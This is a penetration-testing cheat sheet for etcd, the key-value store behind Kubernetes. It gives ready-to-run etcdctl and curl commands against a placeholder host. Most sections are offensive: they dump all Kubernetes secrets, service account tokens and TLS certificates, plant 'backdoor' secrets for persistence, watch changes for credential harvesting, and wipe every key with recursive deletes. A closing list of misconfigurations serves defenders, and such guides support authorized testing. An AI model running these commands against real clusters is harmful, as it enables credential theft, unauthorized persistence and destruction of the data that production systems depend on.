# etcd

**`Default Ports: 2379 (Client API), 2380 (Peer Communication)`**

**etcd** is a distributed, reliable key-value store for the most critical data of a distributed system. It's used for shared configuration, service discovery, and coordinator election in distributed systems. Most notably, etcd is the primary datastore for Kubernetes, storing all cluster state, secrets, and configuration. Compromising etcd means complete access to all Kubernetes secrets, certificates, and cluster configuration - making it one of the highest value targets in cloud-native environments.

### Connect <a href="#connect" id="connect"></a>

#### Using etcdctl (Official CLI) <a href="#using-etcdctl-official-cli" id="using-etcdctl-official-cli"></a>

etcdctl is the official command-line tool for interacting with etcd.

**Basic Connection Setup**

```
# Set API version (v3 is current)
export ETCDCTL_API=3

# Get version
etcdctl --endpoints=http://target.com:2379 version
```

**List Cluster Members**

```
etcdctl --endpoints=http://target.com:2379 member list
```

**Get Keys and Values**

```
# Get specific key
etcdctl --endpoints=http://target.com:2379 get /key/path

# Get all keys with prefix
etcdctl --endpoints=http://target.com:2379 get / --prefix --keys-only
```

**Connect with TLS**

```
etcdctl --endpoints=https://target.com:2379 \
  --cert=/path/to/cert.pem \
  --key=/path/to/key.pem \
  --cacert=/path/to/ca.pem \
  get / --prefix
```

#### Using curl (HTTP API) <a href="#using-curl-http-api" id="using-curl-http-api"></a>

etcd provides a RESTful HTTP API for all operations through two different API versions.

**API v3 (Current)**

The v3 API uses gRPC protocol and requires base64 encoding for keys, offering better performance:

```
# Get key
curl http://target.com:2379/v3/kv/range \
  -X POST \
  -d '{"key":"L2tleQ=="}'  # base64 encoded key "/key"

# List all keys
curl http://target.com:2379/v3/kv/range \
  -X POST \
  -d '{"key":"AA==","range_end":"AA=="}'  # \x00 to get all
```

**API v2 (Deprecated)**

The v2 API is simpler with direct JSON responses, though deprecated it's still widely used:

```
# List all keys recursively
curl http://target.com:2379/v2/keys/?recursive=true

# Get specific key
curl http://target.com:2379/v2/keys/key/path
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use `Nmap` to detect etcd services and check for authentication requirements.

**Basic Port and Version Detection**

```
nmap -p 2379,2380 -sV target.com
```

**HTTP Methods and Access Test**

```
# Enumerate allowed HTTP methods
nmap -p 2379 --script http-methods target.com

# Verify if API is accessible without auth
curl http://target.com:2379/version
```

#### Version Detection <a href="#version-detection" id="version-detection"></a>

Identifying the etcd version helps determine applicable vulnerabilities.

```
# Using etcdctl
etcdctl --endpoints=http://target.com:2379 version

# Using curl
curl http://target.com:2379/version

# Get cluster version
curl http://target.com:2379/v2/stats/self | jq .version
```

#### Authentication Check <a href="#authentication-check" id="authentication-check"></a>

Test whether etcd requires authentication or allows anonymous access.

**Test Anonymous Access**

```
# Test anonymous access
curl http://target.com:2379/v2/keys/

# If returns data, no authentication required
# This is a critical misconfiguration
```

**Test TLS Requirements**

```
# Check if client cert is required
curl https://target.com:2379/version
# Connection refused = TLS required
# Certificate error = Client cert required
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### Key Enumeration <a href="#key-enumeration" id="key-enumeration"></a>

etcd stores all data as key-value pairs - enumerating keys reveals the data structure and helps identify sensitive information.

**Using etcdctl**

```
# List all keys
etcdctl --endpoints=http://target.com:2379 get / --prefix --keys-only

# List Kubernetes secrets specifically
etcdctl --endpoints=http://target.com:2379 get /registry/secrets --prefix --keys-only

# For Kubernetes etcd, important prefixes:
# /registry/secrets/ - Kubernetes secrets
# /registry/configmaps/ - ConfigMaps
# /registry/serviceaccounts/ - Service account tokens
# /registry/pods/ - Pod definitions
# /registry/nodes/ - Node information
```

**Using curl API**

```
# List all keys (API v2)
curl http://target.com:2379/v2/keys/?recursive=true | jq .
```

#### Value Extraction <a href="#value-extraction" id="value-extraction"></a>

After identifying keys, you can extract their values for analysis.

**Get Specific Key Values**

```
# Get specific key value
etcdctl --endpoints=http://target.com:2379 get /registry/secrets/default/admin-token

# Get all keys with values in a prefix
etcdctl --endpoints=http://target.com:2379 get /registry/secrets/ --prefix
```

**Using curl API**

```
# Using curl (API v2)
curl http://target.com:2379/v2/keys/registry/secrets/?recursive=true
```

**Real-time Monitoring**

```
# Watch for changes (real-time monitoring)
etcdctl --endpoints=http://target.com:2379 watch / --prefix
```

#### Member and Cluster Information <a href="#member-and-cluster-information" id="member-and-cluster-information"></a>

Understanding the cluster topology helps in comprehensive compromise.

**Get Cluster Members**

```
# List cluster members
etcdctl --endpoints=http://target.com:2379 member list
```

**Check Cluster Health**

```
# Cluster health
etcdctl --endpoints=http://target.com:2379 endpoint health

# Cluster status
etcdctl --endpoints=http://target.com:2379 endpoint status
```

**Using API for Cluster Info**

```
# Using API
curl http://target.com:2379/v2/stats/leader
curl http://target.com:2379/v2/members
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Unauthenticated Access <a href="#unauthenticated-access" id="unauthenticated-access"></a>

The most critical misconfiguration is exposing etcd without authentication, allowing complete access to all cluster data.

**Testing for Open Access**

```
# Test access
curl http://target.com:2379/v2/keys/?recursive=true

# If successful, you can:
# 1. Read all data (including secrets)
# 2. Modify configuration
# 3. Delete keys (DoS)
# 4. Add malicious keys
```

**Extracting Sensitive Data**

```
# Extract all Kubernetes secrets
etcdctl --endpoints=http://target.com:2379 get /registry/secrets/ --prefix | \
  grep -i "password\|token\|key"
```

#### Kubernetes Secret Extraction <a href="#kubernetes-secret-extraction" id="kubernetes-secret-extraction"></a>

If etcd stores Kubernetes data, you can extract all cluster secrets.

**List and Extract Secrets**

```
# List all secret keys
etcdctl --endpoints=http://target.com:2379 get /registry/secrets/ --prefix --keys-only

# Extract specific secret
etcdctl --endpoints=http://target.com:2379 get /registry/secrets/default/admin-token
```

**Decode Kubernetes Secrets**

```
# Decode Kubernetes secret (stored as protobuf)
# Install: go get k8s.io/apimachinery/pkg/runtime
# Use auger or similar tool to decode

# Or use API server if you extract a token
```

#### Data Manipulation <a href="#data-manipulation" id="data-manipulation"></a>

If you have write access, you can modify critical configuration.

**Modify Existing Keys**

```
# Modify existing key
etcdctl --endpoints=http://target.com:2379 put /config/admin "compromised_value"
```

**Inject Malicious Configuration**

```
# Inject malicious configuration
etcdctl --endpoints=http://target.com:2379 put /registry/secrets/kube-system/backdoor "malicious_secret"

# Using API
curl http://target.com:2379/v2/keys/config/feature -XPUT -d value="malicious"
```

#### Denial of Service <a href="#denial-of-service" id="denial-of-service"></a>

Deleting or corrupting etcd data can cause complete system failure.

**Delete All Data**

```
# Delete all keys (DANGEROUS - will break Kubernetes)
etcdctl --endpoints=http://target.com:2379 del / --prefix
```

**Delete Specific Data**

```
# Delete specific namespace secrets
etcdctl --endpoints=http://target.com:2379 del /registry/secrets/default/ --prefix

# Using API v2
curl http://target.com:2379/v2/keys/?recursive=true -XDELETE
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Complete Cluster Compromise <a href="#complete-cluster-compromise" id="complete-cluster-compromise"></a>

With etcd access, you can extract everything needed to compromise the entire Kubernetes cluster.

**Extract All Secrets**

```
# Extract all secrets
etcdctl --endpoints=http://target.com:2379 get /registry/secrets/ --prefix > all_secrets.txt

# Extract service account tokens
etcdctl --endpoints=http://target.com:2379 get /registry/serviceaccounts/ --prefix
```

**Extract TLS Certificates**

```
# Extract TLS certificates
etcdctl --endpoints=http://target.com:2379 get /registry/secrets/kube-system/ --prefix | grep certificate

# Extract API server certificates
etcdctl --endpoints=http://target.com:2379 get /registry/secrets/kube-system/ --prefix | grep apiserver
```

#### Persistence <a href="#persistence" id="persistence"></a>

Creating persistent backdoors through etcd.

**Add Malicious Secrets**

```
# Add malicious Kubernetes secret
etcdctl --endpoints=http://target.com:2379 put /registry/secrets/kube-system/backdoor-token "malicious_content"
```

**Monitor Changes**

```
# Monitor all changes (for credential harvesting)
etcdctl --endpoints=http://target.com:2379 watch / --prefix > watched_changes.log

# Modify existing deployments (if you can decode/encode protobuf)
# This is complex but possible
```

### etcdctl Commands <a href="#etcdctl-commands" id="etcdctl-commands"></a>

| Command           | Description   | Usage                             |
| ----------------- | ------------- | --------------------------------- |
| `get`             | Get key value | `etcdctl get /key`                |
| `put`             | Set key value | `etcdctl put /key value`          |
| `del`             | Delete key    | `etcdctl del /key`                |
| `watch`           | Watch changes | `etcdctl watch /key --prefix`     |
| `member list`     | List members  | `etcdctl member list`             |
| `snapshot save`   | Backup etcd   | `etcdctl snapshot save backup.db` |
| `endpoint health` | Check health  | `etcdctl endpoint health`         |

### API Versions <a href="#api-versions" id="api-versions"></a>

| Version | Endpoint    | Status     | Notes                |
| ------- | ----------- | ---------- | -------------------- |
| v2      | `/v2/keys/` | Deprecated | Simpler, JSON-based  |
| v3      | `/v3/kv/`   | Current    | gRPC, more efficient |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool       | Description            | Primary Use Case    |
| ---------- | ---------------------- | ------------------- |
| etcdctl    | Official CLI           | etcd interaction    |
| auger      | Kubernetes decoder     | Decode etcd secrets |
| curl       | HTTP client            | API interaction     |
| etcd-dump  | Backup tool            | Data extraction     |
| Metasploit | Exploitation framework | Automated testing   |

### Security Misconfigurations <a href="#security-misconfigurations" id="security-misconfigurations"></a>

* ❌ No authentication/authorization
* ❌ No TLS encryption
* ❌ Client certificate authentication not required
* ❌ Exposed to internet (0.0.0.0)
* ❌ Default ports accessible
* ❌ No RBAC configured
* ❌ Weak or no peer authentication
* ❌ Secrets not encrypted at rest
* ❌ No audit logging
* ❌ Backup files accessible
* ❌ No network segmentation
* ❌ Debug mode enabled

<br>
